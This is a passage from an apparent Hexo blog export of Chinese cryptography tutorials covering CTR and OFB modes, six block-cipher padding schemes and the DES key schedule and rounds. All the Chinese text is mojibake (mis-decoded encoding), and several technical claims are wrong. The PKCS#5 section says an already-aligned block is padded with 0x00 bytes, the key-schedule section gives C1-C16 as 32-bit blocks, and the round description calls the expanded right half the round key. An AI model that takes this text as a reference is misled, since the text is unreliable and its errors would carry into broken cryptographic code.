</p><p>è®¡æ•°å™¨çš„ç”Ÿæˆæ–¹æ³•ï¼Œå‰8ä¸ªå­—èŠ‚ä¸ºnonceï¼Œè¿™ä¸ªå€¼åœ¨æ¯æ¬¡åŠ å¯†æ—¶å¿…é¡»æ—¶ä¸åŒçš„ã€‚å8ä¸ªå­—èŠ‚ä¸ºåˆ†ç»„åºå·ï¼Œè¿™ä¸ªéƒ¨åˆ†é€æ¬¡ç´¯åŠ ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171732965.png" alt="img"> </p><p><strong>OFBæ¨¡å¼ä¸CTRæ¨¡å¼çš„å¯¹æ¯”</strong></p><ul><li>ä¸¤è€…éƒ½æ˜¯æµå¯†ç ã€‚</li><li>OFBæ¨¡å¼æ˜¯å°†åŠ å¯†çš„è¾“å‡ºåé¦ˆåˆ°è¾“å…¥ï¼ŒCTRæ¨¡å¼æ˜¯å°†è®¡æ•°å™¨çš„å€¼ç”¨ä½œè¾“å…¥ã€‚</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171733292.png" alt="img"> </p><p><strong>CTRæ¨¡å¼çš„ç‰¹ç‚¹ï¼š</strong><br>CTRæ¨¡å¼çš„åŠ å¯†åä¸ºè§£å¯†ä½¿ç”¨äº†å®Œå…¨ç›¸åŒçš„ç»“æ„ï¼›å¯ä»¥ä»¥ä»»æ„é¡ºåºå¯¹åˆ†ç»„è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼›å¯ä»¥å®ç°å¹¶è¡Œè®¡ç®—ï¼›åœ¨æ”¯æŒå¹¶è¡Œè®¡ç®—çš„ç³»ç»Ÿä¸­ï¼ŒCTRæ¨¡å¼é€Ÿåº¦éå¸¸å¿«ã€‚</p><h2 id="åˆ†ç»„å¯†ç æ¨¡å¼æ¯”è¾ƒè¡¨"><a href="#åˆ†ç»„å¯†ç æ¨¡å¼æ¯”è¾ƒè¡¨" class="headerlink" title="åˆ†ç»„å¯†ç æ¨¡å¼æ¯”è¾ƒè¡¨"></a>åˆ†ç»„å¯†ç æ¨¡å¼æ¯”è¾ƒè¡¨</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171733185.png" alt="img"> </p><h1 id="ä¸‰-å¡«å……æ–¹å¼"><a href="#ä¸‰-å¡«å……æ–¹å¼" class="headerlink" title="ä¸‰ å¡«å……æ–¹å¼"></a>ä¸‰ å¡«å……æ–¹å¼</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171734942.png" alt="image.png"> </p><p>æ­£å¸¸æŒ‰ç…§DESç®—æ³•æ¥è¯´ï¼Œè¾“å…¥ä¸€ä¸ª8ä¸ªå­—èŠ‚çš„æ˜æ–‡å­—ç¬¦ä¸²ï¼Œè¾“å‡ºçš„ä¹Ÿåº”è¯¥æ˜¯ä¸€ä¸ª8ä¸ªå­—èŠ‚å¯†æ–‡çš„ã€‚ä½†å¾ˆæ˜¾ç„¶ï¼Œåœ¨cyberchefä¸­è¾“å‡ºäº†18ä½çš„å†…å®¹ã€‚</p><p>è¿™ä¸ªæ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿˜æœ‰ä¸€ä¸ªï¼ŒDESç®—æ³•è¦æ±‚è¾“å…¥çš„æ˜æ–‡å¿…é¡»ä¸º64ä½&#x2F;64ä½çš„å€æ•°ã€‚ä½†æ˜¯è¿™å—å°†è¾“å…¥è°ƒæ•´ä¸º â€œ1234567â€ï¼Œ7ä¸ªå­—èŠ‚ï¼Œå‘ç°ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸åŠ å¯†çš„ï¼Œå¹¶ä¸”è¾“å‡ºå¯†æ–‡é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171734781.png" alt="image.png"> </p><p>è¿™å—åˆæ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>åˆ†ç»„å¯†ç ä¸­ï¼Œéœ€è¦å°†æ˜æ–‡æŒ‰æŒ‡å®šå¤§å°è¿›è¡Œåˆ†ç»„ï¼Œç”±äºæ˜æ–‡å¹¶éæŒ‡å®šå¤§å°çš„æ•´æ•°å€ï¼Œå› æ­¤åœ¨æ˜æ–‡çš„æœ€åä¸€ä¸ªåˆ†ç»„éœ€è¦å°†å…¶å¡«å……è‡³åŠ å¯†ç®—æ³•æ‰€è¦æ±‚çš„åˆ†ç»„å¤§å°åè¿›è¡ŒåŠ å¯†ã€‚</p><p>åœ¨è§£å¯†æ—¶ï¼ŒæŒ‰ç…§åŒæ ·çš„å¡«å……æ¨¡å¼å°†å¡«å……çš„æ•°æ®å»é™¤ã€‚å¸¸è§çš„å¡«å……æ–¹å¼æœ‰ä»¥ä¸‹6ç§ï¼š</p><ul><li>NoPadding</li><li>PKCS#5</li><li>PKCS#7</li><li>ISO 10126</li><li>ANSI X9.23</li><li>ZerosPadding</li></ul><h2 id="NoPadding"><a href="#NoPadding" class="headerlink" title="NoPadding"></a>NoPadding</h2><p>ä¸å¡«å……ï¼Œåœ¨æ­¤å¡«å……ä¸‹åŸå§‹æ•°æ®å¿…é¡»æ˜¯åˆ†ç»„å¤§å°çš„æ•´æ•°å€ï¼Œéæ•´æ•°å€æ—¶æ— æ³•ä½¿ç”¨è¯¥æ¨¡å¼</p><h2 id="PKCS-5"><a href="#PKCS-5" class="headerlink" title="PKCS#5"></a>PKCS#5</h2><p>å¡«å……è‡³ç¬¦åˆå—å¤§å°çš„æ•´æ•°å€ï¼Œå¡«å……å€¼ä¸ºå¡«å……æ•°é‡æ•°ï¼ˆç¼ºå‡ ä¸ªå­—èŠ‚å°±å¡«å‡ ä¸ªç¼ºçš„å­—èŠ‚æ•°ï¼‰</p><ul><li>åŸå§‹ï¼šFF FF FF FF FF FF FF FF FF</li><li>å¡«å……ï¼šFF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</li></ul><p>æ¯”å¦‚è¿™å—åŸå§‹é•¿åº¦ä¸º9ä¸ªå­—èŠ‚ï¼Œç¡®å°‘7ä¸ªå­—èŠ‚ä¸º8çš„å€æ•°ï¼Œåˆ™å¡«å……å€¼ä¸º â€œ07â€</p><p>ã€æ³¨æ„ã€‘å¦‚æœæ•°æ®ä¸ç¼ºçœï¼Œä¹Ÿéœ€è¦å¡«å……ä¸€ä¸ªå—é•¿åº¦çš„ 0x00ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>åŸå§‹ï¼šFF FF FF FF FF FF FF FF </li><li>å¡«å……ï¼šFF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00</li></ul><p>ç›®çš„ï¼šä¸ºäº†æ›´æ˜ç¡®å“ªäº›å†…å®¹æ˜¯åŸå§‹æ•°æ®ï¼Œå“ªäº›æ˜¯å¡«å……çš„ã€‚å¦‚æœæœ‰16ä¸ªå­—èŠ‚çš„åŸæ–‡ä¸ºFF FF FF FF FF FF FF FF FF FF FF FF FF 03 03 03 ,é‚£è¿™å—çš„03å°±ä¸èƒ½åŒºåˆ†æ˜¯åŸå§‹æ•°æ®éƒ¨åˆ†è¿˜æ˜¯å¡«å……éƒ¨åˆ†äº†ã€‚</p><p>å¦‚æœå¡«å……äº†ä¸€ä¸ªå—é•¿åº¦çš„ 0x00ï¼Œå°±å¯ä»¥æ˜ç¡®æ­¤å¤„çš„03ä¸ºåŸå§‹æ•°æ®éƒ¨åˆ†ã€‚</p><h2 id="PKCS-7"><a href="#PKCS-7" class="headerlink" title="PKCS#7"></a>PKCS#7</h2><p>ç¼ºå‡ ä¸ªå­—èŠ‚å°±å¡«å……å‡ ä¸ªç¼ºçš„å­—èŠ‚æ•°ï¼ˆ255  bytesï¼‰</p><p>å¦‚æœæ•°æ®ç¼ºçœï¼Œä¹Ÿéœ€è¦å¡«å……ä¸€ä¸ªå—é•¿åº¦çš„0x08</p><p>ã€æ³¨æ„ã€‘åœ¨AESåŠ å¯†å½“ä¸­ä¸¥æ ¼æ¥è¯´æ˜¯ä¸èƒ½ä½¿ç”¨pkcs5çš„ï¼Œå› ä¸º<strong>AES</strong>çš„å—å¤§å°æ˜¯ 16bytes è€ŒPKCS#5åªèƒ½ç”¨äº8 bytesã€‚é€šå¸¸åœ¨AESä¸­æ‰€è¯´çš„PKCS#5å°±æ˜¯PKCS#7</p><h2 id="ISO-10126Padding"><a href="#ISO-10126Padding" class="headerlink" title="ISO 10126Padding"></a>ISO 10126Padding</h2><p>å¡«å……è‡³ç¬¦åˆå—å¤§å°çš„æ•´æ•°å€ï¼Œå¡«å……å€¼æœ€åä¸€ä¸ªå­—èŠ‚ä¸ºå¡«å……çš„æ•°é‡æ•°ï¼Œå…¶ä»–å­—èŠ‚éšæœºå¤„ç†</p><ul><li>åŸå§‹ï¼šFF FF FF FF FF FF FF FF FF</li><li>å¡«å……ï¼šFF FF FF FF FF FF FF FF FF 3F 7A B4 09 14 36 07</li></ul><h2 id="ANSI-X9-23"><a href="#ANSI-X9-23" class="headerlink" title="ANSI X9.23"></a>ANSI X9.23</h2><p>å¡«å……è‡³ç¬¦åˆå—å¤§å°çš„æ•´æ•°å€ï¼Œå¡«å……å€¼æœ€åä¸€ä¸ªå­—èŠ‚ä¸ºå¡«å……çš„æ•°é‡æ•°ï¼Œå…¶ä»–å­—èŠ‚å¡« 0</p><ul><li>åŸå§‹ï¼šFF FF FF FF FF FF FF FF FF</li><li>å¡«å……ï¼šFF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</li></ul><h2 id="ZeroByte-Padding"><a href="#ZeroByte-Padding" class="headerlink" title="ZeroByte Padding"></a>ZeroByte Padding</h2><p>å¡«å……è‡³ç¬¦åˆå—å¤§å°çš„æ•´æ•°å€ï¼Œå¡«å……å€¼ä¸º 0</p><ul><li>åŸå§‹ï¼šFF FF FF FF FF FF FF FF FF</li><li>å¡«å……ï¼šFF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</li></ul><p>å¦‚æœå·²ç»æ˜¯128bitçš„å€æ•°ï¼Œä»éœ€è¦å¡«å……ã€‚  </p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯¹ç§°åŠ å¯† </tag>
            
            <tag> åŠ å¯†æ¨¡å¼ </tag>
            
            <tag> å¡«å…… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹DES</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BDES/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BDES/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-DESåŸç†ä»‹ç»"><a href="#ä¸€-DESåŸç†ä»‹ç»" class="headerlink" title="ä¸€ DESåŸç†ä»‹ç»"></a>ä¸€ DESåŸç†ä»‹ç»</h1><p>å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œè®²è§£çš„å¾ˆè¯¦ç»†ï¼š</p><p><a href="https://blog.csdn.net/Demonslzh/article/details/129129493">https://blog.csdn.net/Demonslzh/article/details/129129493</a></p><p>DESç®—æ³•é‡‡ç”¨åˆ†ç»„å¯†ç ï¼Œå°†æ˜æ–‡åˆ†æˆ64ä½ä¸€ç»„ï¼Œå¯†é’¥é•¿åº¦ä¸º56ä½ã€‚å…¶åŸºæœ¬åŸç†æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„ç½®æ¢ã€æ›¿æ¢å’Œå¼‚æˆ–è¿ç®—ï¼Œåˆ©ç”¨å¯†é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚</p><ul><li>DESä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•</li><li>DESè¿˜æ˜¯ä¸€ç§åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œç®—æ³•æ¯æ¬¡å¤„ç†å›ºå®šé•¿åº¦çš„æ•°æ®æ®µï¼Œç§°ä¹‹ä¸ºåˆ†ç»„</li><li>DESç®—æ³•è¿‡ç¨‹çš„å…³é”®æ˜¯ä»ç»™å®šçš„åˆå§‹å¯†é’¥ä¸­å¾—åˆ°16ä¸ªå­å¯†é’¥çš„å‡½æ•°</li><li>è¦åŠ å¯†ä¸€ç»„æ˜æ–‡ï¼Œæ¯ä¸ªå­å¯†é’¥æŒ‰ç…§é¡ºåº(1-16)ä»¥ä¸€ç³»åˆ—çš„ä½æ“ä½œæ–½åŠ äºæ•°æ®ä¸Šï¼Œæ¯ä¸ªå­å¯†é’¥ä¸€æ¬¡ï¼Œä¸€å…±é‡å¤16æ¬¡</li><li>DESç®—æ³•çš„åˆ†ç»„å¤§å°æ˜¯64ä½ï¼Œå› æ­¤ï¼Œå¦‚æœéœ€è¦åŠ å¯†çš„æ˜æ–‡é•¿åº¦<strong>ä¸è¶³64ä½</strong>ï¼Œéœ€è¦è¿›è¡Œ<strong>å¡«å……</strong>ï¼›å¦‚æœæ˜æ–‡é•¿åº¦<strong>è¶…è¿‡64ä½</strong>ï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ†ç»„æ¨¡å¼è¿›è¡Œ<strong>åˆ†ç»„åŠ å¯†</strong>ã€‚</li><li>è™½ç„¶DESç®—æ³•çš„<strong>åˆ†ç»„å¤§å°æ˜¯64ä½</strong>ï¼Œä½†æ˜¯ç”±äºDESç®—æ³•çš„<strong>å¯†é’¥é•¿åº¦åªæœ‰56ä½</strong>ã€‚</li></ul><h2 id="å­å¯†é’¥kçš„ç”Ÿæˆ"><a href="#å­å¯†é’¥kçš„ç”Ÿæˆ" class="headerlink" title="å­å¯†é’¥kçš„ç”Ÿæˆ"></a>å­å¯†é’¥kçš„ç”Ÿæˆ</h2><p>DESç®—æ³•é‡‡ç”¨äº†æ¯è½®å­å¯†é’¥ç”Ÿæˆçš„æ–¹å¼æ¥å¢åŠ å¯†é’¥çš„å¤æ‚æ€§å’Œå®‰å…¨æ€§ã€‚æ¯è½®å­å¯†é’¥éƒ½æ˜¯ç”±ä¸»å¯†é’¥ï¼ˆ64ä½ï¼‰é€šè¿‡å¯†é’¥è°ƒåº¦ç®—æ³•ï¼ˆKey Schedule Algorithmï¼‰ç”Ÿæˆçš„ã€‚DESç®—æ³•çš„å¯†é’¥è°ƒåº¦ç®—æ³•å¯ä»¥å°†64ä½çš„ä¸»å¯†é’¥åˆ†æˆ16ä¸ªå­å¯†é’¥ï¼Œæ¯ä¸ªå­å¯†é’¥48ä½ï¼Œç”¨äºæ¯è½®åŠ å¯†ä¸­ä¸è¾“å…¥æ•°æ®è¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚</p><p>é€šè¿‡å­å¯†é’¥ç”Ÿæˆçš„æµç¨‹å›¾æ¥çœ‹ä¸‹æ•´ä¸ªè¿‡ç¨‹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171631431.png" alt="img"> </p><p>1ã€å°†64ä½ä¸»å¯†é’¥ç»è¿‡ç½®æ¢é€‰æ‹©1ï¼ˆPermuted Choice 1ç®€å†™ä¸ºPC-1ï¼‰åè¾“å‡ºäº†56ä½ï¼Œå°†å…¶åˆ†ä¸ºå·¦å³ä¸¤ä¸ª28ä½çš„æ•°æ®å—ï¼Œåˆ†åˆ«è®°ä¸ºC0å’ŒD0ã€‚åŒä¸Šé¢æˆ‘ä»¬è®²è¿‡çš„ç½®æ¢è§„åˆ™ä¸€æ ·ï¼ŒPC-1ç½®æ¢å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå›ºå®šçš„ç½®æ¢è¡¨ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171632968.png" alt="img"> </p><p>ä»PC-1çš„ç½®æ¢è¡¨ä¸­å¯ä»¥çœ‹åˆ°ï¼Œèˆå¼ƒæ‰çš„8ä½æ•°æ®æ˜¯åŸå§‹æ•°æ®ä¸­<strong>æ¯8ä½æ•°æ®çš„æœ€åä¸€ä½</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å¥‡å¶æ£€éªŒä½ã€‚è¿™8ä½è¢«ä¸¢å¼ƒæ˜¯å› ä¸ºå®ƒä»¬å¯¹äºå¯†é’¥çš„å®‰å…¨æ€§æ²¡æœ‰è´¡çŒ®ï¼Œè€Œä¸”èƒ½å¤Ÿä½¿DESç®—æ³•çš„è®¡ç®—é€Ÿåº¦æ›´å¿«ã€‚</p><p>ã€ä¸¾ä¾‹ã€‘</p><p>å‡è®¾æˆ‘ä»¬è¾“å…¥çš„64ä½åˆå§‹å¯†é’¥å¯¹åº”å­—ç¬¦ä¸² â€œ12345678â€</p><p>åˆ™K(64) &#x3D; 0011000100110010001100110011010000110101001101100011011100111000</p><p>è¿™å—å¯¹åˆå§‹çš„kè¿›è¡Œå˜æ¢ï¼š</p><ul><li>ç¬¬ä¸€ä½ä¸ºç¬¬57ä½ï¼š0</li><li>ç¬¬äºŒä½ä¸ºç¬¬49ä½ï¼š0</li><li>ç¬¬ä¸‰ä½ä¸ºç¬¬41ä½ï¼š1</li><li>â€¦â€¦</li></ul><p>2ã€å¯¹C0å’ŒD0è¿›è¡Œ<strong>å¾ªç¯å·¦ç§»</strong>æ“ä½œã€‚å¾ªç¯å·¦ç§»å®Œæˆåç”ŸæˆC1å’ŒD1ã€‚å› æ­¤ï¼Œåœ¨16ä¸ªè½®æ¬¡çš„è®¡ç®—å½“ä¸­ä¼šå¾—åˆ°16ä¸ª32ä½çš„æ•°æ®å—C1-C16å’ŒD1-D16ã€‚åœ¨DESä¸­å¾ªç¯å·¦ç§»ä¹Ÿæœ‰<strong>å›ºå®šçš„è§„åˆ™</strong>ã€‚</p><p>å¯¹äºi&#x3D;1ï¼Œ2ï¼Œâ€¦ï¼Œ16ï¼Œå¯¹äºCiå’ŒDiï¼Œè‹¥iä¸º1ï¼Œ2ï¼Œ9æˆ–16ï¼Œåˆ™å¾ªç¯å·¦ç§»ä¸€ä½ï¼Œå¦åˆ™å¾ªç¯å·¦ç§»ä¸¤ä½ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171637802.png" alt="image.png"> </p><p>3ã€å¯¹äºC1ï¼ŒD1ï¼Œå°†å®ƒä»¬ç»è¿‡ç½®æ¢é€‰æ‹©2(Permuted Choice 2 ç®€å†™ä½PC-2ï¼‰åï¼Œå¾—åˆ°48ä½çš„å­å¯†é’¥K1ï¼Œç”¨äºæ¯è½®åŠ å¯†ä¸­ä¸è¾“å…¥æ•°æ®è¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚PC-2ç½®æ¢çš„è¾“å…¥æ˜¯ç”±PC-1ç½®æ¢ç”Ÿæˆçš„56ä½çš„å¯†é’¥ï¼Œè€Œå®ƒçš„è¾“å‡ºæ˜¯48ä½çš„å­å¯†é’¥ã€‚PC-2ç½®æ¢å°†56ä½çš„å¯†é’¥é‡æ–°æ’åˆ—ï¼Œä¸¢å¼ƒäº†8ä½å¹¶é€‰å–äº†å…¶ä¸­çš„48ä½ä½œä¸ºå­å¯†é’¥ã€‚PC-2çš„ç½®æ¢è§„åˆ™å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171637897.png" alt="image.png"> </p><p>å³PC-2ç½®æ¢è¡¨çš„ç¬¬ä¸€è¡Œè¡¨ç¤ºé€‰æ‹©äº†è¾“å…¥å¯†é’¥ä¸­çš„ç¬¬14ã€17ã€11ã€24ã€1å’Œ5ä½ï¼Œå¹¶å°†å®ƒä»¬ä½œä¸ºè¾“å‡ºå­å¯†é’¥çš„å‰6ä½ã€‚ä»¥æ­¤ç±»æ¨â€¦</p><p>4ã€è‡³æ­¤ï¼Œç»è¿‡PC-2åçš„ç»“æœå°±æ˜¯æˆ‘ä»¬å½“å‰è½®æ¬¡çš„å­å¯†é’¥K1äº†ã€‚åœ¨æ•´ä¸ªDESåŠ å¯†è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆ16ä¸ª48ä½<strong>å­å¯†é’¥K1-K16</strong>ï¼Œåˆ†åˆ«ç”¨äºDESç®—æ³•ä¸­çš„16è½®åŠ å¯†è¿‡ç¨‹ï¼Œä»è€Œä¿è¯æ¯è½®åŠ å¯†æ‰€ä½¿ç”¨çš„å¯†é’¥éƒ½æ˜¯ä¸åŒçš„ï¼Œå¢åŠ äº†ç ´è§£çš„éš¾åº¦ã€‚</p><h2 id="DESåŠ å¯†æµç¨‹"><a href="#DESåŠ å¯†æµç¨‹" class="headerlink" title="DESåŠ å¯†æµç¨‹"></a>DESåŠ å¯†æµç¨‹</h2><p>å½“è¾“å…¥äº†ä¸€æ¡64ä½çš„æ•°æ®ä¹‹åï¼ŒDESå°†é€šè¿‡ä»¥ä¸‹æ­¥éª¤è¿›è¡ŒåŠ å¯†ã€‚åœ¨ç¬¬4éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å¯¹æ¯ä¸ªæµç¨‹è¿›è¡Œè¯¦è§£ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171641222.png" alt="img"> </p><p>1ã€åˆå§‹ç½®æ¢ï¼ˆIPç½®æ¢ï¼‰ï¼šå°†è¾“å…¥çš„64ä½æ˜æ–‡å—è¿›è¡Œç½®æ¢å’Œé‡æ–°æ’åˆ—ï¼Œç”Ÿæˆæ–°çš„64ä½æ•°æ®å—ã€‚</p><p>2ã€åŠ å¯†è½®æ¬¡ï¼šDESåŠ å¯†ç®—æ³•å…±æœ‰16ä¸ªè½®æ¬¡ï¼Œæ¯ä¸ªè½®æ¬¡éƒ½åŒ…æ‹¬å››ä¸ªæ­¥éª¤ï¼š</p><ul><li>å°†64ä½æ•°æ®å—åˆ†ä¸ºå·¦å³ä¸¤ä¸ª32ä½å—ã€‚</li><li>å³ä¾§32ä½å—ä½œä¸ºè¾“å…¥ï¼Œç»è¿‡æ‰©å±•ã€å¼‚æˆ–ã€ç½®æ¢ç­‰æ“ä½œç”Ÿæˆä¸€ä¸ª48ä½çš„æ•°æ®å—ã€‚è¿™ä¸ª48ä½çš„æ•°æ®å—è¢«ç§°ä¸ºâ€œè½®å¯†é’¥â€ï¼Œå®ƒæ˜¯æ ¹æ®åŠ å¯†ç®—æ³•çš„ä¸»å¯†é’¥ç”Ÿæˆçš„å­å¯†é’¥ã€‚</li><li>å°†å·¦ä¾§32ä½å—å’Œè½®å¯†é’¥è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç»“æœä½œä¸ºæ–°çš„å³ä¾§32ä½å—ã€‚</li><li>å°†å³ä¾§32ä½å—ä¸åŸæ¥çš„å·¦ä¾§32ä½å—è¿›è¡Œè¿æ¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„64ä½æ•°æ®å—ï¼Œä½œä¸ºä¸‹ä¸€è½®çš„è¾“å…¥ã€‚</li></ul><p>3ã€æœ«ç½®æ¢ï¼ˆFPç½®æ¢ï¼‰ï¼šåœ¨æœ€åä¸€ä¸ªè½®æ¬¡å®Œæˆåï¼Œå°†ç»è¿‡åŠ å¯†çš„æ•°æ®å—è¿›è¡Œç½®æ¢å’Œé‡æ–°æ’åˆ—ï¼Œå¾—åˆ°åŠ å¯†åçš„64ä½å¯†æ–‡ã€‚</p><h2 id="DESç®—æ³•æ­¥éª¤è¯¦è§£"><a href="#DESç®—æ³•æ­¥éª¤è¯¦è§£" class="headerlink" title="DESç®—æ³•æ­¥éª¤è¯¦è§£"></a>DESç®—æ³•æ­¥éª¤è¯¦è§£</h2><h3 id="åˆå§‹ç½®æ¢-Initial-Permutationï¼ŒIPç½®æ¢"><a href="#åˆå§‹ç½®æ¢-Initial-Permutationï¼ŒIPç½®æ¢" class="headerlink" title="åˆå§‹ç½®æ¢(Initial Permutationï¼ŒIPç½®æ¢)"></a>åˆå§‹ç½®æ¢(Initial Permutationï¼ŒIPç½®æ¢)</h3><p>IPç½®æ¢æ˜¯å°†è¾“å…¥çš„64ä½æ˜æ–‡å—è¿›è¡Œç½®æ¢å’Œé‡æ–°æ’åˆ—ï¼Œç”Ÿæˆæ–°çš„64ä½æ•°æ®å—ã€‚</p><p><strong>ç›®çš„</strong>:å¢åŠ åŠ å¯†çš„æ··ä¹±ç¨‹åº¦ï¼Œä½¿æ˜æ–‡ä¸­çš„æ¯ä¸€ä½éƒ½èƒ½å¤Ÿå¯¹åé¢çš„åŠ å¯†è¿‡ç¨‹äº§ç”Ÿå½±å“ï¼Œæé«˜åŠ å¯†å¼ºåº¦ã€‚</p><p>æˆ‘ä»¬å°†æŠŠ64ä½çš„é¡ºåºæŒ‰ä¸‹è¡¨ä¸­è§„å®šçš„é¡ºåºæ”¾ç½®ï¼Œå›¾ä¸­çš„æ•°å­—æ˜¯åœ¨64ä½æ˜æ–‡ä¸­æ¯ä¸ªæ¯”ç‰¹çš„ç´¢å¼•ä½ç½®ã€‚<strong>æ³¨æ„ï¼Œåœ¨DESä¸­ï¼Œè¿™ä¸ªç½®æ”¾è§„åˆ™æ˜¯å›ºå®šçš„</strong>ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171644541.png" alt="img"> </p><p>å³å°†åŸæ¥ä½äºç¬¬58ä¸ªä½ç½®çš„æ•°æ®æ”¾åœ¨ç¬¬1ä¸ªä½ç½®ï¼ŒåŸæ¥ä½äºç¬¬50ä¸ªä½ç½®çš„å…ƒç´ æ”¾åœ¨ç¬¬2ä¸ªä½ç½®ï¼Œç¬¬42ä¸ªæ”¾åœ¨ç¬¬3ä¸ªï¼Œ34-&gt;4ä»¥æ­¤ç±»æ¨â€¦</p><p>åˆå§‹ç½®æ¢çš„é€†ç½®æ¢ï¼ˆFinal Permutationï¼ŒFPç½®æ¢ï¼‰æ˜¯å°†åŠ å¯†åçš„æ•°æ®å—è¿›è¡Œç½®æ¢å’Œé‡æ–°æ’åˆ—ï¼Œå¾—åˆ°æœ€ç»ˆçš„åŠ å¯†ç»“æœï¼Œä¸åˆå§‹ç½®æ¢ç›¸å¯¹åº”ã€‚</p><h3 id="åŠ å¯†è½®æ¬¡"><a href="#åŠ å¯†è½®æ¬¡" class="headerlink" title="åŠ å¯†è½®æ¬¡"></a>åŠ å¯†è½®æ¬¡</h3><p>åˆå§‹ç½®æ¢å®Œæˆåï¼Œæ˜æ–‡è¢«åˆ’åˆ†æˆäº†ç›¸åŒé•¿åº¦ï¼ˆ32ä½ï¼‰çš„å·¦å³ä¸¤éƒ¨åˆ†ï¼Œè®°ä½œL0,R0ã€‚æ¥ä¸‹æ¥å°±ä¼šè¿›è¡Œ16ä¸ªè½®æ¬¡çš„åŠ å¯†äº†ã€‚<br>æˆ‘ä»¬ä»å•ç‹¬ä¸€ä¸ªè½®æ¬¡æ¥çœ‹ã€‚é¦–å…ˆæŠŠç›®å…‰èšç„¦åœ¨R0è¿™é‡Œã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171649981.png" alt="img"> </p><p>å³åŠéƒ¨åˆ†R0ä¼šä½œä¸ºä¸‹ä¸€è½®æ¬¡çš„å·¦åŠéƒ¨åˆ†L1çš„è¾“å…¥ã€‚å…¶æ¬¡ï¼ŒR0ä¼šè¡¥ä½åˆ°48ä½å’Œæœ¬è½®æ¬¡ç”Ÿæˆçš„48ä½K0(é©¬ä¸Šè®²K0çš„ç”Ÿæˆ)è¾“å…¥åˆ°Fè½®å‡½æ•°ä¸­å»ã€‚Få‡½æ•°çš„è¾“å‡ºç»“æœä¸º32ä½ï¼Œç»“æœ<strong>F(R0,K0)<strong>ä¼šå’Œ</strong>L0</strong>è¿›è¡Œå¼‚æˆ–è¿ç®—ä½œä¸ºä¸‹ä¸€è½®æ¬¡å³åŠéƒ¨åˆ†R1çš„è¾“å…¥ã€‚</p><p>ä»¥æ­¤ç±»æ¨ï¼Œé‡å¤16è½®è¿ç®—ã€‚æ‰€ä»¥ï¼Œä¸Šé¢æè¿°çš„è¿‡ç¨‹å¯ä»¥ç”¨ä»¥ä¸‹å…¬å¼è¡¨è¿°ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171649887.png" alt="img"> </p><h3 id="Fè½®å‡½æ•°"><a href="#Fè½®å‡½æ•°" class="headerlink" title="Fè½®å‡½æ•°"></a>Fè½®å‡½æ•°</h3><h4 id="æ‰©å±•è¿ç®—ï¼šæ‰©å±•Råˆ°48ä½"><a href="#æ‰©å±•è¿ç®—ï¼šæ‰©å±•Råˆ°48ä½" class="headerlink" title="æ‰©å±•è¿ç®—ï¼šæ‰©å±•Råˆ°48ä½"></a>æ‰©å±•è¿ç®—ï¼šæ‰©å±•Råˆ°48ä½</h4><p>å°†32ä½çš„R0å³åŠéƒ¨åˆ†è¿›è¡Œæ‰©å±•ï¼Œå¾—åˆ°ä¸€ä¸ª48ä½çš„æ•°æ®å—ã€‚åŒæ ·çš„ï¼Œæ•°æ®æ‹“å±•ä¹Ÿæ˜¯æ ¹æ®ä¸€ä¸ª<strong>å›ºå®š</strong>çš„ç½®æ¢è¡¨ã€‚çº¢æ¡†ä¸­å°±æ˜¯æˆ‘ä»¬è¦è¡¥ä½çš„æ•°æ®ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171656499.png" alt="img"> 